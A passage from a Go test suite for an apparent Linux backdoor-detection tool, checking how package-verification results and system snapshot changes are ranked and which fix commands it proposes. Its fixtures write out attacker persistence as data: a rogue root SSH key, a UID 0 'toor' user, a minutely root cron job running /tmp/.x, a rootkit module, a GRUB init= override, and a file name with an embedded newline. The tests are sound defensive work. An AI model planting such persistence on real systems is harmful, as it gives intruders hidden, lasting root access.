	res.Suspicious = []pkgverify.FileVerdict{{Path: "/usr/bin/ls", Package: "coreutils", Version: "9.1-1", Expected: h("ls 9.1"), Actual: h("ls 9.1"), Reason: reason, Source: "archive", Kind: pkgverify.KindStatOverride}}
	r := run(clean(), nil, res)
	f := must(t, r, "pkg.suspicious:/usr/bin/ls", model.SevBackdoor)
	if !strings.Contains(f.Why, reason) || !strings.Contains(f.Evidence[0].Detail, reason) {
		t.Errorf("reason missing: why %q evidence %+v", f.Why, f.Evidence[0])
	}
	if !strings.HasPrefix(f.Fix, evidenceCopy+"'/usr/bin/ls' /root/telltale-evidence/ && ") {
		t.Errorf("fix %q", f.Fix)
	}
	if !strings.Contains(f.Fix, "dpkg-statoverride --remove -- '/usr/bin/ls'") {
		t.Errorf("statoverride fix %q", f.Fix)
	}
}

func TestJudgeModeRelaxedIsNote(t *testing.T) {
	ls := clean().Files[1]
	res := archive(
		pkgverify.FileVerdict{Path: "/usr/bin/ls", Package: "coreutils", Expected: ls.SHA256, Actual: ls.SHA256, Reason: "mode differs (less permissive): deb 4755, disk 0755", Source: "archive", Kind: pkgverify.KindModeLessPermissive},
		pkgverify.FileVerdict{Path: "/usr/bin/openssl", Package: "openssl", Expected: "x", Actual: "x", Source: "archive"})
	r := run(clean(), nil, res)
	must(t, r, "pkg.mode_relaxed:/usr/bin/ls", model.SevNote)
	absent(t, r, "pkg.mode_relaxed:/usr/bin/openssl")
}

func TestJudgeConffilesExplainedQuietly(t *testing.T) {
	res := archive()
	res.Conffiles = []pkgverify.ConffileDiff{
		{Path: "/etc/ssh/sshd_config", Package: "openssh-server", Version: "1:9.2p1-2+deb12u3", Expected: h("default"), Actual: h("edited"), Source: "archive"},
		{Path: "/etc/ssh/moduli", Package: "openssh-server", Version: "1:9.2p1-2+deb12u3", Expected: h("m"), Actual: h("m2"), Source: "archive"},
	}
	r := run(clean(), nil, res)
	for _, f := range r.Findings {
		if hasEvidencePath(&f, "/etc/ssh/sshd_config") {
			t.Errorf("conffile ranked as finding %s", f.Key)
		}
	}
	g := explained(r, "pkg.conffiles:openssh-server")
	if g == nil || !hasEvidencePath(g, "/etc/ssh/sshd_config") || !hasEvidencePath(g, "/etc/ssh/moduli") {
		t.Fatalf("conffiles group %+v", g)
	}
	if r.ExitCode != 0 {
		t.Errorf("exit %d", r.ExitCode)
	}
}

func TestJudgeIndexSignatureErrors(t *testing.T) {
	bad := "BAD SIGNATURE: https://deb.debian.org/debian/dists/bookworm/InRelease: no valid signature (the index was tampered with or intercepted, or telltale's built-in keys are out of date; nothing that depends on it was verified)"
	other := "could not download 2 packages; first error: timeout"
	res := archive()
	res.Errors = []string{bad, other}
	r := run(clean(), nil, res)
	f := must(t, r, "pkg.index_signature", model.SevNote)
	if f.Evidence[0].Detail != bad {
		t.Errorf("evidence %+v", f.Evidence)
	}
	if !slices.Contains(r.CouldNotRuleOut, bad) {
		t.Errorf("could not rule out %q", r.CouldNotRuleOut)
	}
	if !slices.Contains(r.Skipped, model.Skip{Check: "packages", Reason: other}) {
		t.Errorf("skipped %+v", r.Skipped)
	}
	if slices.Contains(r.Skipped, model.Skip{Check: "packages", Reason: bad}) {
		t.Errorf("signature error hidden among skipped checks")
	}
}

func TestJudgeLowerTrustSourcesNote(t *testing.T) {
	res := archive(
		pkgverify.FileVerdict{Path: "/usr/bin/a", Package: "a", Source: "snapshot"},
		pkgverify.FileVerdict{Path: "/usr/bin/b", Package: "b", Source: "snapshot"},
		pkgverify.FileVerdict{Path: "/usr/bin/c", Package: "c", Source: "launchpad"},
		pkgverify.FileVerdict{Path: "/usr/bin/d", Package: "d", Source: "archive"})
	r := run(clean(), nil, res)
	f := must(t, r, "pkg.lower_trust", model.SevNote)
	if !strings.Contains(f.Title, "3") {
		t.Errorf("title %q", f.Title)
	}
	if r := run(clean(), nil, archive(pkgverify.FileVerdict{Path: "/usr/bin/d", Package: "d", Source: "archive"})); find(r, "pkg.lower_trust") != nil {
		t.Errorf("lower-trust note without lower-trust sources")
	}
}

// --- snapshot change rulings ---

// stillAsSeen is the test a line-editing fix makes first: the file must
// still have the content the scan hashed.
func stillAsSeen(p, sha string) string {
	return `[ "$(sha256sum < '` + p + `' | cut -d' ' -f1)" = '` + sha + `' ]`
}

func rootKeys(lines ...string) model.PersistFile {
	return model.PersistFile{Path: "/root/.ssh/authorized_keys", Kind: model.PersistKindAuthorizedKeys, Mode: 0o100600,
		SHA256: h(strings.Join(lines, "\n")), Lines: lines, MTime: changed}
}

func TestJudgeRootKeyNotesDroppedWithSnapshot(t *testing.T) {
	c := clean()
	c.Persist = []model.PersistFile{rootKeys(ownerKey)}
	if r := run(c, nil, nil); find(r, "heur.root_key:/root/.ssh/authorized_keys:1") == nil {
		t.Fatalf("no-snapshot scan lost the root key note: %v", keys(r))
	}
	r := run(c, snapOf(c), nil)
	for _, k := range keys(r) {
		if strings.HasPrefix(k, "heur.root_key:") {
			t.Errorf("root key note kept with a snapshot: %s", k)
		}
	}
}

func TestJudgeNewRootKeyIsBackdoor(t *testing.T) {
	old := clean()
	old.Persist = []model.PersistFile{rootKeys(ownerKey)}
	cur := clone(old)
	cur.Persist = []model.PersistFile{rootKeys(ownerKey, serverKey, evilKey)}

	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.root_key:/root/.ssh/authorized_keys:3", model.SevBackdoor)
	if e := f.Evidence[0]; e.Path != "/root/.ssh/authorized_keys" || e.Line != 3 || e.After != evilKey || e.When == nil {
		t.Errorf("evidence %+v", e)
	}
	want := evidenceCopy + "'/root/.ssh/authorized_keys' /root/telltale-evidence/ && " + stillAsSeen("/root/.ssh/authorized_keys", cur.Persist[0].SHA256) + " && sed -i '3d' '/root/.ssh/authorized_keys'"
	if !strings.HasPrefix(f.Fix, want) {
		t.Errorf("fix %q", f.Fix)
	}
	// The telltale server's own key is expected, and the only other change
	// is the new key itself, so there is no second, generic finding.
	absent(t, r, "snap.root_key:/root/.ssh/authorized_keys:2")
	absent(t, r, "snap.persist:/root/.ssh/authorized_keys")
}

func TestJudgeUserAdded(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Accounts.Users = append(cur.Accounts.Users,
		model.User{Name: "toor", UID: 0, GID: 0, Home: "/root", Shell: "/bin/bash", Password: model.PasswordState{Known: true, Set: true, Algo: "yescrypt", Digest: "d2", LastChange: 20000}},
		model.User{Name: "deploy", UID: 1001, GID: 1001, Home: "/home/deploy", Shell: "/bin/bash", Password: model.PasswordState{Known: true, Locked: true, LastChange: 20000}})
	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.user_added:toor", model.SevBackdoor)
	if !strings.Contains(f.Fix, "userdel -f -- 'toor'") || !strings.HasPrefix(f.Fix, evidenceCopy) {
		t.Errorf("fix %q", f.Fix)
	}
	must(t, r, "snap.user_added:deploy", model.SevNote)

	// An existing account given user id 0 is as bad as a new one.
	old2 := clone(cur)
	cur2 := clone(old2)
	for i := range cur2.Accounts.Users {
		if cur2.Accounts.Users[i].Name == "deploy" {
			cur2.Accounts.Users[i].UID = 0
		}
	}
	must(t, run(cur2, snapOf(old2), nil), "snap.user_changed:deploy", model.SevBackdoor)
}

func TestJudgePasswordChangeShowsNoSecret(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Accounts.Users[0].Password.Digest = "digest-root-2"
	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.user_changed:root", model.SevNote)
	if !strings.Contains(f.Evidence[0].After, "password changed") {
		t.Errorf("evidence %+v", f.Evidence[0])
	}
	b, _ := json.Marshal(r)
	if strings.Contains(string(b), "digest-root") {
		t.Errorf("password digest leaked into the report")
	}
}

func TestJudgePrivilegedGroupMember(t *testing.T) {
	old := clean()
	cur := clone(old)
	for i := range cur.Accounts.Groups {
		switch cur.Accounts.Groups[i].Name {
		case "sudo":
			cur.Accounts.Groups[i].Members = []string{"deploy"}
		case "staff", "users":
			cur.Accounts.Groups[i].Members = []string{"deploy"}
		}
	}
	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.group:sudo", model.SevBackdoor)
	if !strings.Contains(f.Fix, "gpasswd -d 'deploy' -- 'sudo'") {
		t.Errorf("fix %q", f.Fix)
	}
	// staff can write /usr/local, which comes first in root's PATH.
	must(t, r, "snap.group:staff", model.SevBackdoor)
	must(t, r, "snap.group:users", model.SevNote)
}

func TestJudgeListenerAdded(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("openssh-server", "1:9.2p1-2+deb12u3", "/usr/sbin/sshd"))
	old.Files = append(old.Files, file("/usr/sbin/sshd", "sshd", 0o755))
	cur := clone(old)
	cur.Runtime.Processes = []model.Process{
		{PID: 10, UID: 0, Exe: "/usr/sbin/sshd", Comm: "sshd"},
		{PID: 11, UID: -1, Exe: "/usr/local/bin/agent", Comm: "agent"},
		{PID: 12, UID: 1000, Exe: "/tmp/.x/y", Comm: "y"},
	}
	cur.Runtime.Sockets = []model.Socket{
		{Proto: "tcp", Local: "0.0.0.0:2222", State: "LISTEN", Listening: true, PID: 10},
		{Proto: "tcp", Local: "0.0.0.0:4444", State: "LISTEN", Listening: true, PID: 11},
		{Proto: "tcp", Local: "0.0.0.0:31337", State: "LISTEN", Listening: true, PID: 12},
		{Proto: "udp", Local: "0.0.0.0:5353", Listening: true},
	}
	r := run(cur, snapOf(old), nil)
	must(t, r, "snap.listener:tcp:0.0.0.0:2222", model.SevNote)
	f := must(t, r, "snap.listener:tcp:0.0.0.0:4444", model.SevBackdoor)
	if !strings.Contains(f.Fix, "cp /proc/11/exe /root/telltale-evidence/11.exe") {
		t.Errorf("fix %q", f.Fix)
	}
	must(t, r, "snap.listener:tcp:0.0.0.0:31337", model.SevBackdoor)
	must(t, r, "snap.listener:udp:0.0.0.0:5353", model.SevNote)
}

func TestJudgeModuleAdded(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3", "/lib/modules/6.1.0-25-amd64/kernel/net/wg.ko"))
	cur := clone(old)
	cur.Runtime.Modules = []model.KernelModule{
		{Name: "wg", File: "/lib/modules/6.1.0-25-amd64/kernel/net/wg.ko"},
		{Name: "diamorphine", File: "/lib/modules/6.1.0-25-amd64/extra/diamorphine.ko"},
	}
	r := run(cur, snapOf(old), nil)
	must(t, r, "snap.module:wg", model.SevNote)
	f := must(t, r, "snap.module:diamorphine", model.SevBackdoor)
	if !strings.Contains(f.Fix, "modinfo -- 'diamorphine'") || !strings.HasPrefix(f.Fix, evidenceCopy+"'/lib/modules/6.1.0-25-amd64/extra/diamorphine.ko'") {
		t.Errorf("fix %q", f.Fix)
	}
}

func TestJudgeFileChangeRankedByLocation(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/etc/security/limits.conf", "limits", 0o644))
	cur := clone(old)
	setFile(cur, file("/usr/bin/ls", "ls trojan", 0o755))
	setFile(cur, file("/usr/share/doc/openssl/README", "readme 2", 0o644))
	setFile(cur, file("/etc/hostname", "web02", 0o644))
	setFile(cur, file("/etc/security/limits.conf", "limits 2", 0o644))
	setFile(cur, file("/usr/local/bin/tool", "tool", 0o755))
	setFile(cur, file("/usr/bin/openssl", "openssl patched", 0o755))
	res := archive()
	res.Mismatch = []pkgverify.FileVerdict{{Path: "/usr/bin/openssl", Package: "openssl", Version: "3.0.14-1~deb12u2", Expected: h("openssl 3.0.14"), Actual: h("openssl patched"), Reason: "differs from the file in the signed package", Source: "archive"}}

	r := run(cur, snapOf(old), res)
	f := must(t, r, "snap.file_modified:/usr/bin/ls", model.SevBackdoor)
	if !strings.HasPrefix(f.Fix, evidenceCopy+"'/usr/bin/ls' /root/telltale-evidence/ && apt-get install --reinstall -- 'coreutils'") {
		t.Errorf("fix %q", f.Fix)
	}
	// An exception accepts the first evidence's After, so it must name the
	// new content exactly, not by a short hash prefix.
	if after := f.Evidence[0].After; !strings.Contains(after, h("ls trojan")) {
		t.Errorf("evidence does not carry the full new hash: %q", after)
	}
	must(t, r, "snap.file_modified:/etc/security/limits.conf", model.SevBackdoor)
	// A package's data file about which package verification, which ran,
	// said nothing: silence is not a pass (see noVerdict).
	must(t, r, "snap.file_modified:/usr/share/doc/openssl/README", model.SevBackdoor)
	must(t, r, "snap.file_modified:/etc/hostname", model.SevNote)
	a := must(t, r, "snap.file_added:/usr/local/bin/tool", model.SevBackdoor)
	if a.Fix != evidenceCopy+"'/usr/local/bin/tool' /root/telltale-evidence/ && rm -- '/usr/local/bin/tool'   # only if you did not put it there" {
		t.Errorf("fix %q", a.Fix)
	}
	// The change behind a package mismatch is evidence on that finding.
	absent(t, r, "snap.file_modified:/usr/bin/openssl")
	m := must(t, r, "pkg.mismatch:/usr/bin/openssl", model.SevTampering)
	if len(m.Evidence) < 2 {
		t.Errorf("snapshot change not folded into the mismatch: %+v", m.Evidence)
	}
}

func TestJudgeRoutineChangesAreNotBackdoorSigns(t *testing.T) {
	old := clean()
	old.Files = append(old.Files,
		model.FileEntry{Path: "/usr/share/doc", Type: "dir", Mode: 0o40755, Size: 4096},
		file("/boot/initrd.img-6.1.0-25-amd64", "initrd", 0o644),
		file("/etc/shadow", "shadow", 0o640),
		file("/var/lib/dpkg/info/openssl.md5sums", "sums", 0o644))
	cur := clone(old)
	setFile(cur, model.FileEntry{Path: "/usr/share/doc", Type: "dir", Mode: 0o40755, Size: 8192})
	setFile(cur, file("/boot/initrd.img-6.1.0-25-amd64", "initrd 2", 0o644))
	setFile(cur, file("/etc/shadow", "shadow 2", 0o640))
	cur.Accounts.Users[0].Password.Digest = "digest-root-2"
	// A new alternatives link, with what it leads to recorded as the file
	// scan records it on a real machine: the link is judged by where it
	// really leads, and what the inventory cannot follow is not a note.
	setFile(cur, model.FileEntry{Path: "/usr/bin/awk", Type: "symlink", Target: "/etc/alternatives/awk", Mode: 0o120777})
	old.Files = append(old.Files, symlinkAt("/etc/alternatives/awk", "/usr/bin/mawk", taken), file("/usr/bin/mawk", "mawk", 0o755))
	cur.Files = append(cur.Files, symlinkAt("/etc/alternatives/awk", "/usr/bin/mawk", taken), file("/usr/bin/mawk", "mawk", 0o755))

	// Nothing was updated: a rebuilt initrd is a backdoor sign.
	r := run(cur, snapOf(old), nil)
	must(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)

	// An update of a package that does not rebuild the initramfs leaves it
	// a backdoor sign; dpkg's own records of the updated package are
	// explained with it.
	setVersion(cur, "openssl", "3.0.15-1~deb12u1")
	setFile(cur, file("/var/lib/dpkg/info/openssl.md5sums", "sums 2", 0o644))
	r = run(cur, snapOf(old), archive())
	must(t, r, "snap.file_modified:/boot/initrd.img-6.1.0-25-amd64", model.SevBackdoor)
	absent(t, r, "snap.file_modified:/var/lib/dpkg/info/openssl.md5sums")
	// No file of openssl changed and nothing confirmed its new version: the
	// version change is a note (R63), with dpkg's records on it.
	if v := must(t, r, "snap.pkg_version_only:openssl", model.SevNote); !hasEvidencePath(v, "/var/lib/dpkg/info/openssl.md5sums") {
		t.Errorf("dpkg records not shown with the version change: %+v", v.Evidence)
	}
	absent(t, r, "snap.file_modified:/usr/share/doc")
	absent(t, r, "snap.file_modified:/etc/shadow")
	must(t, r, "snap.user_changed:root", model.SevNote)
	must(t, r, "snap.file_added:/usr/bin/awk", model.SevNote)
}

func TestJudgeKernelUpdateGeneratedFilesFoldIntoKernelPackage(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("linux-image-6.1.0-25-amd64", "6.1.106-3"))
	old.Files = append(old.Files,
		file("/boot/initrd.img-6.1.0-25-amd64", "initrd 25", 0o644),
		file("/lib/modules/6.1.0-25-amd64/modules.dep", "dep 25", 0o644),
		file("/boot/grub/grub.cfg", "menu 25", 0o444),
		file("/etc/default/grub", "GRUB_CMDLINE_LINUX=\"\"", 0o644))
	cur := clone(old)
	removePkg(cur, "linux-image-6.1.0-25-amd64")
	cur.Packages.Installed = append(cur.Packages.Installed, pkg("linux-image-6.1.0-27-amd64", "6.1.115-1"))
	cur.Files = slices.DeleteFunc(cur.Files, func(e model.FileEntry) bool { return strings.Contains(e.Path, "6.1.0-25") })
	cur.Files = append(cur.Files,
		file("/boot/initrd.img-6.1.0-27-amd64", "initrd 27", 0o644),
		file("/lib/modules/6.1.0-27-amd64/modules.dep", "dep 27", 0o644))
	setFile(cur, file("/boot/grub/grub.cfg", "menu 27", 0o444))

	// The new kernel is confirmed by one of its files.
	r := run(cur, snapOf(old), archive(pkgverify.FileVerdict{Path: "/boot/vmlinuz-6.1.0-27-amd64", Package: "linux-image-6.1.0-27-amd64", Version: "6.1.115-1", Source: "archive"}))
	for _, k := range []string{"snap.file_added:/boot/initrd.img-6.1.0-27-amd64", "snap.file_added:/lib/modules/6.1.0-27-amd64/modules.dep",
		"snap.file_removed:/boot/initrd.img-6.1.0-25-amd64", "snap.file_removed:/lib/modules/6.1.0-25-amd64/modules.dep"} {
		absent(t, r, k)
	}
	g := explained(r, "explained:linux-image-6.1.0-27-amd64")
	if g == nil || !hasEvidencePath(g, "/boot/initrd.img-6.1.0-27-amd64") || !hasEvidencePath(g, "/lib/modules/6.1.0-27-amd64/modules.dep") {
		t.Errorf("new kernel's generated files not shown with it: %+v", g)
	}
	// The old kernel's removal is routine too, and its generated files went
	// with it.
	absent(t, r, "snap.pkg_removed:linux-image-6.1.0-25-amd64")
	if o := explained(r, "explained:linux-image-6.1.0-25-amd64"); o == nil || !hasEvidencePath(o, "/boot/initrd.img-6.1.0-25-amd64") {
		t.Errorf("old kernel's initrd not shown with its removal: %+v", o)
	}
	// A kernel install rebuilds the boot menu: shown with the new kernel.
	absent(t, r, "snap.file_modified:/boot/grub/grub.cfg")
	if !hasEvidencePath(g, "/boot/grub/grub.cfg") {
		t.Errorf("boot menu not shown with the new kernel: %+v", g.Evidence)
	}

	// The kernel command line is a persistence location.
	setFile(cur, file("/etc/default/grub", "GRUB_CMDLINE_LINUX=\"init=/tmp/x\"", 0o644))
	must(t, run(cur, snapOf(old), archive()), "snap.file_modified:/etc/default/grub", model.SevBackdoor)
}

func TestJudgeRootsEverydayFilesAreQuiet(t *testing.T) {
	old := clean()
	old.Files = append(old.Files, file("/root/.bash_history", "ls", 0o600), file("/root/.ssh/known_hosts", "a", 0o644), file("/root/.viminfo", "v", 0o600))
	cur := clone(old)
	setFile(cur, file("/root/.bash_history", "ls\ncd", 0o600))
	setFile(cur, file("/root/.ssh/known_hosts", "a\nb", 0o644))
	setFile(cur, file("/root/.lesshst", "l", 0o600))
	cur.Files = slices.DeleteFunc(cur.Files, func(e model.FileEntry) bool { return e.Path == "/root/.viminfo" })
	r := run(cur, snapOf(old), nil)
	absent(t, r, "snap.file_modified:/root/.bash_history")
	absent(t, r, "snap.file_modified:/root/.ssh/known_hosts")
	absent(t, r, "snap.file_added:/root/.lesshst")
	// A wiped history or editor state is still listed.
	must(t, r, "snap.file_removed:/root/.viminfo", model.SevNote)

	// root's key file and SSH configuration stay persistence locations.
	cur.Files = append(cur.Files, file("/root/.ssh/rc", "evil", 0o755))
	must(t, run(cur, snapOf(old), nil), "snap.file_added:/root/.ssh/rc", model.SevBackdoor)
}

func TestJudgeConffileReplacedByUpgradeIsExplained(t *testing.T) {
	const p = "/etc/security/limits.conf"
	old := clean()
	lp := pkg("libpam-modules", "1.5.2-6", p)
	lp.Conffiles = map[string]string{p: "0123456789abcdef0123456789abcdef"}
	old.Packages.Installed = append(old.Packages.Installed, lp)
	old.Files = append(old.Files, file(p, "limits", 0o644))
	cur := clone(old)
	setVersion(cur, "libpam-modules", "1.5.2-6+deb12u1")
	setFile(cur, file(p, "limits, new default", 0o644))

	// The signed package says this is its default.
	def := archive()
	def.ConffileDefaults = []pkgverify.FileVerdict{{Path: p, Package: "libpam-modules", Version: "1.5.2-6+deb12u1", Expected: h("limits, new default"), Actual: h("limits, new default"), Source: "archive", Kind: pkgverify.KindConffileDefault}}
	r := run(cur, snapOf(old), def)
	absent(t, r, "snap.file_modified:"+p)
	if g := explained(r, "explained:libpam-modules"); g == nil || !hasEvidencePath(g, p) {
		t.Errorf("conffile replaced by the upgrade not explained: %+v", g)
	}
	// Edited away from the default: ranked as a persistence location.
	res := archive()
	res.Conffiles = []pkgverify.ConffileDiff{{Path: p, Package: "libpam-modules", Version: "1.5.2-6+deb12u1", Expected: h("default"), Actual: h("limits, new default")}}
	must(t, run(cur, snapOf(old), res), "snap.file_modified:"+p, model.SevBackdoor)
}

func cron(lines ...string) model.PersistFile {
	return model.PersistFile{Path: "/etc/cron.d/backup", Kind: model.PersistKindCron, Mode: 0o100644, SHA256: h(strings.Join(lines, "\n")), Lines: lines, MTime: changed}
}

func TestJudgePersistChanged(t *testing.T) {
	old := clean()
	old.Persist = []model.PersistFile{cron("0 3 * * * root /usr/local/bin/backup")}
	old.Files = append(old.Files, file("/etc/cron.d/backup", "0 3 * * * root /usr/local/bin/backup", 0o644))
	cur := clone(old)
	cur.Persist = []model.PersistFile{cron("0 3 * * * root /usr/local/bin/backup", "* * * * * root /tmp/.x")}
	setFile(cur, file("/etc/cron.d/backup", "0 3 * * * root /usr/local/bin/backup\n* * * * * root /tmp/.x", 0o644))

	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.persist:/etc/cron.d/backup", model.SevBackdoor)
	if f.Evidence[0].After != cur.Persist[0].SHA256 {
		t.Errorf("first evidence must carry the file's new hash (the value an exception accepts): %+v", f.Evidence[0])
	}
	if !slices.ContainsFunc(f.Evidence, func(e model.Evidence) bool { return e.Line == 2 && e.After == "* * * * * root /tmp/.x" }) {
		t.Errorf("added line missing: %+v", f.Evidence)
	}
	if !strings.HasPrefix(f.Fix, evidenceCopy+"'/etc/cron.d/backup' /root/telltale-evidence/ && "+stillAsSeen("/etc/cron.d/backup", cur.Persist[0].SHA256)+" && sed -i '2d' '/etc/cron.d/backup'") {
		t.Errorf("fix %q", f.Fix)
	}
	absent(t, r, "snap.file_modified:/etc/cron.d/backup")
}

func TestJudgePersistConffileUpgradeExplained(t *testing.T) {
	const p = "/etc/cron.daily/logrotate"
	lr := func(version, text string) (model.Package, model.PersistFile) {
		pk := pkg("logrotate", version, p, "/usr/sbin/logrotate")
		pk.Conffiles = map[string]string{p: "0123456789abcdef0123456789abcdef"}
		return pk, model.PersistFile{Path: p, Kind: model.PersistKindCron, Mode: 0o100755, SHA256: h(text), Lines: strings.Split(text, "\n"), MTime: changed}
	}
	old := clean()
	pk, pf := lr("3.21.0-1", "#!/bin/sh\nlogrotate /etc/logrotate.conf")
	old.Packages.Installed = append(old.Packages.Installed, pk)
	old.Persist = []model.PersistFile{pf}
	old.Files = append(old.Files, file(p, "#!/bin/sh\nlogrotate /etc/logrotate.conf", 0o755))

	upgraded := clone(old)
	pk2, pf2 := lr("3.21.0-2", "#!/bin/sh\nexec logrotate /etc/logrotate.conf")
	upgraded.Packages.Installed[len(upgraded.Packages.Installed)-1] = pk2
	upgraded.Persist = []model.PersistFile{pf2}
	nf := file(p, "#!/bin/sh\nexec logrotate /etc/logrotate.conf", 0o755)
	setFile(upgraded, nf)

	// The upgrade replaced the conffile and it matches the new default
	// (package verification says so): explained.
	def := archive()
	def.ConffileDefaults = []pkgverify.FileVerdict{{Path: p, Package: "logrotate", Version: "3.21.0-2", Expected: nf.SHA256, Actual: nf.SHA256, Source: "archive", Kind: pkgverify.KindConffileDefault}}
	r := run(upgraded, snapOf(old), def)
	absent(t, r, "snap.persist:"+p)
	absent(t, r, "snap.file_modified:"+p)
	if g := explained(r, "explained:logrotate"); g == nil || !hasEvidencePath(g, p) {
		t.Errorf("conffile update not explained: %+v", g)
	}

	// It differs from the package default: not explained by the upgrade.
	res := archive()
	res.Conffiles = []pkgverify.ConffileDiff{{Path: p, Package: "logrotate", Version: "3.21.0-2", Expected: h("default"), Actual: nf.SHA256}}
	must(t, run(upgraded, snapOf(old), res), "snap.persist:"+p, model.SevBackdoor)

	// Package verification said nothing about it: dpkg status calling it a
	// conffile explains nothing.
	must(t, run(upgraded, snapOf(old), archive()), "snap.persist:"+p, model.SevBackdoor)

	// Same change with no upgrade behind it.
	same := clone(upgraded)
	setVersion(same, "logrotate", "3.21.0-1")
	must(t, run(same, snapOf(old), archive()), "snap.persist:"+p, model.SevBackdoor)

	// Without package verification there is nothing to explain it with.
	must(t, run(upgraded, snapOf(old), nil), "snap.persist:"+p, model.SevBackdoor)
}

func TestJudgeNewPackageRaisedBy(t *testing.T) {
	cases := []struct {
		name  string
		files []model.FileEntry
		edit  func(c *model.Collection)
	}{
		{"caps", []model.FileEntry{func() model.FileEntry {
			e := file("/usr/bin/pinger", "p", 0o755)
			e.Caps = "0100000200200000"
			return e
		}()}, nil},
		{"module", []model.FileEntry{file("/lib/modules/6.1.0-25-amd64/updates/x.ko", "ko", 0o644)}, nil},
		{"pam", []model.FileEntry{file("/usr/lib/x86_64-linux-gnu/security/pam_x.so", "pam", 0o644)}, nil},
		{"unit", []model.FileEntry{file("/lib/systemd/system/xd.service", "[Service]", 0o644)}, func(c *model.Collection) {
			c.Persist = append(c.Persist, model.PersistFile{Path: "/etc/systemd/system/multi-user.target.wants/xd.service", Kind: model.PersistKindSystemdEnabled,
				Mode: 0o120777, SHA256: h("/lib/systemd/system/xd.service"), Lines: []string{"/lib/systemd/system/xd.service"}, MTime: changed})
		}},
		{"listener", []model.FileEntry{file("/usr/sbin/xd", "xd", 0o755)}, func(c *model.Collection) {
			c.Runtime.Processes = append(c.Runtime.Processes, model.Process{PID: 77, UID: 0, Exe: "/usr/sbin/xd"})
			c.Runtime.Sockets = append(c.Runtime.Sockets, model.Socket{Proto: "tcp", Local: "0.0.0.0:8080", Listening: true, PID: 77})
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			old := clean()
			cur := clone(old)
			res := archive()
			var paths []string
			for _, e := range tc.files {
				cur.Files = append(cur.Files, e)
				paths = append(paths, e.Path)
				res.Verified = append(res.Verified, pkgverify.FileVerdict{Path: e.Path, Package: "xpkg", Version: "1", Expected: e.SHA256, Actual: e.SHA256, Source: "archive"})
			}
			cur.Packages.Installed = append(cur.Packages.Installed, pkg("xpkg", "1", paths...))
			if tc.edit != nil {
				tc.edit(cur)
			}
			r := run(cur, snapOf(old), res)
			f := must(t, r, "snap.pkg_installed:xpkg", model.SevBackdoor)
			if tc.name == "unit" {
				absent(t, r, "snap.persist:/etc/systemd/system/multi-user.target.wants/xd.service")
				if !hasEvidencePath(f, "/etc/systemd/system/multi-user.target.wants/xd.service") {
					t.Errorf("enable link not shown on the package finding: %+v", f.Evidence)
				}
			}
		})
	}
}

func TestJudgeSecurityPackageRemovedIsWeak(t *testing.T) {
	old := clean()
	old.Packages.Installed = append(old.Packages.Installed, pkg("fail2ban", "1.0.2-2"), pkg("jq", "1.6-2.1"))
	cur := clone(old)
	removePkg(cur, "fail2ban")
	removePkg(cur, "jq")
	r := run(cur, snapOf(old), nil)
	f := must(t, r, "snap.pkg_removed:fail2ban", model.SevWeak)
	if !strings.Contains(f.Fix, "apt-get install -- 'fail2ban'") {
		t.Errorf("fix %q", f.Fix)
	}
	must(t, r, "snap.pkg_removed:jq", model.SevNote)
}

// --- fixes, evidence and assembly ---

func TestJudgeCheckFixComesFromFixFor(t *testing.T) {
	c := clean()
	c.Accounts.Users = append(c.Accounts.Users, model.User{Name: "toor", UID: 0, Home: "/root", Shell: "/bin/bash",
		Password: model.PasswordState{Known: true, Set: true, Algo: "yescrypt", Digest: "d", LastChange: 20000}})
	it, _ := checklist.ByID("TT-ACCT-001")
	want := it.FixFor(c, ctx)
	if want == it.Fix {
		t.Fatalf("test needs an item whose machine-specific fix differs from the static one")
	}
	f := must(t, run(c, nil, nil), "check:TT-ACCT-001", model.SevWeak)
	if f.Fix != want {
		t.Errorf("fix %q, want %q", f.Fix, want)
	}
	if f.Evidence[0].After != "UID 0 besides root: toor" {
		t.Errorf("observed value not in evidence: %+v", f.Evidence[0])
	}
}

func TestJudgeFixQuotesAndRefusesControlCharacters(t *testing.T) {
	old := clean()
	cur := clone(old)
	cur.Files = append(cur.Files, file("/usr/local/bin/it's", "q", 0o755), file("/usr/local/bin/bad\nname", "n", 0o755))
	r := run(cur, snapOf(old), nil)
	q := must(t, r, "snap.file_added:/usr/local/bin/it's", model.SevBackdoor)
	if !strings.Contains(q.Fix, `rm -- '/usr/local/bin/it'\''s'`) {
		t.Errorf("fix %q", q.Fix)
	}
	n := must(t, r, "snap.file_added:/usr/local/bin/bad\nname", model.SevBackdoor)
	if strings.Contains(n.Fix, "rm") || strings.Contains(n.Fix, "\n") || !strings.Contains(n.Fix, "control") {
		t.Errorf("fix for a name with a newline: %q", n.Fix)
	}
}

func TestJudgeDuplicateKeysMergedKeepingHighest(t *testing.T) {
	j := newJudge(Input{Collection: clean()}, clean())
	j.add(&model.Finding{Key: "k", Severity: model.SevNote, Title: "low", Evidence: []model.Evidence{{Detail: "a"}}})
	j.add(&model.Finding{Key: "k", Severity: model.SevBackdoor, Title: "high", Evidence: []model.Evidence{{Detail: "b"}}})
	j.add(&model.Finding{Key: "k", Severity: model.SevWeak, Title: "mid", Evidence: []model.Evidence{{Detail: "a"}}})
	if len(j.findings) != 1 {
		t.Fatalf("%d findings", len(j.findings))
	}
	f := j.findings[0]
	if f.Severity != model.SevBackdoor || f.Title != "high" || len(f.Evidence) != 2 {
		t.Errorf("merged %+v", f)
	}
}

func TestJudgeSkippedListsCollectionAndCheckSkips(t *testing.T) {
	c := clean()
	c.Skipped = []model.Skip{{Check: "accounts", Reason: "/etc/shadow: permission denied"}}
	r := run(c, nil, nil)
	if !slices.Contains(r.Skipped, c.Skipped[0]) {
